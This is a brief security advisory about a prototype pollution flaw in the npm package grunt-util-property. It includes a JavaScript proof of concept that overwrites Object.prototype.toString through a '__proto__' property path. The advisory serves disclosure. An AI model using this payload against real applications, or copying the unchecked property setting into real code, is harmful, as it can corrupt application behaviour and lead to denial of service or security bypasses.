# Overview
`grunt-util-property` is a Grunt util for getting and setting properties, this package are vulnerable to Prototype Pollution.

The function call could be tricked into adding or modifying properties of `Object.prototype` using a __proto__ payload.

# Proof of Concept
```
var grunt = require("grunt");
var a = require("grunt-util-property");
var b = a(grunt);
b.call({}, '__proto__.toString', 123);
console.log({}.toString);
```